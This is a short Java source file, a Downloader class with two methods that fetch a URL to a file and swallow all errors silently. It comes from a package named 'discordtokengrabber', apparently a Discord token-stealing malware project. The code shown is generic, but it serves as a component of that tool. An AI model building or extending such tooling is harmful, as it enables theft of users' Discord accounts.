package com.github.dedinc.discordtokengrabber.utils;

import java.io.File;
import java.io.InputStream;
import java.net.URL;
import java.nio.file.Files;
import java.nio.file.Paths;
import java.nio.file.StandardOpenOption;

public class Downloader {
	public void getHTML(String url, String path) {
		try {
			if (!new File(path).exists()) {
				new File(path).createNewFile();
			}
			Files.write(Paths.get(new File(path).toURI()), Helper.getRequest().get(url).getBytes(), StandardOpenOption.WRITE);
		   } catch (Exception e) {
	    }
	}

	public void download(String url, String path) {
		try {
			InputStream source = new URL(url).openStream();
			Files.copy(source, Paths.get(path));
		   } catch (Exception e) {
	    }
	}
}
